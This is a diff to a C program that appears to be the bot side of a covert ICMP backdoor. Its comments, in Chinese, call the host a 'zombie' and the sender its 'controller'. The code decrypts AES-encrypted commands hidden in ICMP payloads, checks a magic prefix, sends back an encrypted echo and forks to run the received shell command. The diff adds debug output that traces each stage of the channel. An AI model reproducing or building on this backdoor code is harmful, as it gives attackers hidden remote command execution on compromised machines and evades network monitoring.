@@ -1,3 +1,5 @@
+
+
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
@@ -150,6 +152,8 @@ int main() {
                 continue;
             }
 
+printf("[主控->肉雞] 加密後ICMP封包payload： %s\n", b64buf);
+
             // -----------------------------------------------------------
             // 拆出 IV + ciphertext
             // -----------------------------------------------------------
@@ -197,7 +201,7 @@ int main() {
             clean[clean_len] = '\0';
 
             // -----------------------------------------------------------
-            // ★ MAGIC 驗證：不是 RJCMD| 開頭一律丟掉
+            // ★ MAGIC 驗證：不是 開頭一律丟掉
             // -----------------------------------------------------------
             size_t magic_len = strlen(MAGIC_PREFIX);
             if (clean_len < (int)magic_len ||
@@ -206,6 +210,7 @@ int main() {
                 continue;   // 不回覆、不執行
             }
 
+printf("[主控->肉雞] shell指令： %s\n", clean);
             // 真正指令在 MAGIC_PREFIX 之後
             char *real_cmd = clean + magic_len;
 
@@ -225,7 +230,7 @@ int main() {
                 continue;
             }
 
-            printf("收到主控(指令): %s\n", real_cmd);
+           // printf("收到主控(指令): %s\n", real_cmd);
 
             // ============================================================================
             // checkAlive：只回覆 Alive,<timestamp>，不執行 system()
@@ -290,6 +295,7 @@ int main() {
             unsigned char reply_iv[16];
             RAND_bytes(reply_iv, 16);
 
+
             unsigned char reply_ct[2100];
             int reply_ct_len = aes_encrypt(key, reply_iv,
                                            (unsigned char*)reply_text,
@@ -304,6 +310,8 @@ int main() {
             int b64_len = EVP_EncodeBlock(reply_b64,
                                           reply_raw,
                                           reply_ct_len + 16);
+
+reply_b64[b64_len] = '\0'; 
 
             char reply_pkt[3000];
             memset(reply_pkt, 0, sizeof(reply_pkt));
@@ -327,10 +335,11 @@ int main() {
             sendto(sockfd, reply_pkt, reply_len, 0,
                    (struct sockaddr*)&cli, sizeof(cli));
 
-            printf("已echo RJcopy,ZKcommand,%s\n", real_cmd);
+            printf("[肉雞->主控] echo明文： RJcopy,ZKcommand,%s\n", real_cmd);
 
+            printf("[肉雞->主控] 加密後ICMP封包payload： %s\n", reply_b64);
             // 再執行真正指令
-            printf("執行指令: %s\n", real_cmd);
+            printf("[Linux] 執行shell指令: %s\n", real_cmd);
 pid_t pid = fork();
 if (pid == 0) {
     setsid();  
